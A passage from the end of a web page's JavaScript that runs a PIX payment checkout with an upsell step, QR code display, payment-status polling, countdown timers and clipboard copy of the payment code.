            localStorage.setItem('dadosUpsell', JSON.stringify(dados));

            fetch('gerarPixBlackCat.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dados)
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('loadingOverlay').classList.add('hidden');
                if (data.success) mostrarPixUpsell(data.data);
                else notify('Erro ao processar', true);
            })
            .catch(() => {
                document.getElementById('loadingOverlay').classList.add('hidden');
                notify('Erro ao processar', true);
            });
        }

        function mostrarPixUpsell(data) {
            document.getElementById('formStep5').classList.add('hidden');
            document.getElementById('formStep6').classList.remove('hidden');
            document.getElementById('qrcode-upsell').src = data.qrcode_image;
            document.getElementById('qrcode-mobile-upsell').src = data.qrcode_image;
            document.getElementById('pixCodeUpsell').value = data.qrcode_text;
            const d = JSON.parse(localStorage.getItem('dadosUpsell'));
            document.getElementById('pixTituloUpsell').textContent = d.titulo;
            document.getElementById('pixValorUpsell').textContent = `R$ ${(d.valor/100).toFixed(2).replace('.', ',')}`;
            iniciarTimerUpsell();
            verificarPagamentoUpsell(data.transaction_id);
        }

        function verificarPagamentoUpsell(tid) {
            function check() {
                fetch(`verificarPagamento.php?id=${tid}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.success && (d.status === 'paid' || d.status === 'approved')) {
                            document.getElementById('formStep6').classList.add('hidden');
                            document.getElementById('formStep7').classList.remove('hidden');
                            clearInterval(i);
                        }
                    }).catch(() => {});
            }
            const i = setInterval(check, 10000);
            check();
        }

        function copiarPix() {
            const p = document.getElementById('pixCode');
            p.select();
            document.execCommand('copy');
            notify('C√≥digo PIX copiado!');
            GTMTracker.trackConversion(parseFloat(valor.replace(',', '.')), 'pix_' + Date.now());
        }

        function copiarPixUpsell() {
            const p = document.getElementById('pixCodeUpsell');
            p.select();
            document.execCommand('copy');
            notify('C√≥digo PIX copiado!');
        }

        function iniciarTimer() {
            const el = document.getElementById('timer');
            let t = 15 * 60;
            function update() {
                const m = Math.floor(t / 60), s = t % 60;
                el.textContent = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
                if (t === 0) { clearInterval(i); document.getElementById('analiseModal').classList.remove('hidden'); }
                else t--;
            }
            const i = setInterval(update, 1000);
            update();
        }

        function iniciarTimerUpsell() {
            const el = document.getElementById('timerUpsell');
            let t = 15 * 60;
            function update() {
                const m = Math.floor(t / 60), s = t % 60;
                el.textContent = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
                if (t === 0) { clearInterval(i); document.getElementById('analiseModal').classList.remove('hidden'); }
                else t--;
            }
            const i = setInterval(update, 1000);
            update();
        }

        function toggleQRCode() {
            const qr = document.getElementById('mobile-qrcode');
            const txt = document.getElementById('qr-toggle-text');
            if (qr.classList.contains('hidden')) {
                qr.classList.remove('hidden');
                txt.textContent = 'Ocultar QR Code';
            } else {
                qr.classList.add('hidden');
                txt.textContent = 'Ver QR Code';
            }
        }
    </script>

</body>
</html>
